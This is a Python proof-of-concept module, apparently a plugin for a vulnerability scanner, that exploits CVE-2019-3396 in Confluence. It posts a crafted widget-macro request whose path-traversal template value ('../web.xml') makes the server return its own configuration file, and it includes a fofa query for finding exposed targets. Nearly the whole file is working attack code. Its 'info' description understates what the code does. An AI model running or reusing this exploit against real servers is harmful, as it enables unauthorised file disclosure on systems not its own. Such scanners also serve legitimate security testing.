#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import re
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    '''
    fofa:  "confluence" && port=8090
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.CONFLUENCE
        self.name = 'CVE-2019-3396'
        self.keyword = ['confluence']
        self.info = 'Get the web application status and title'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://www.seebug.org/vuldb/ssvid-97898'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            filename = "../web.xml"
            limitSize = 100
            payload = self.base_url + "rest/tinymce/1/macro/preview"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "Referer": self.base_url + "pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
                "Content-Type": "application/json; charset=utf-8"
            }
            _data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
            async with ClientSession() as session:
                async with session.post(url=payload,data=_data, headers=headers) as response:
                    if response != None:
                        text = await response.text()
                        if response.status == 200 and "</web-app>" in text:
                            m = re.search('<web-app[\s\S]+<\/web-app>', text)
                            if m:
                                content = m.group()[:limitSize]
                                self.flag = 1
                                self.req.append({"content": content})
                                self.res.append({"info": payload, "key": filename})
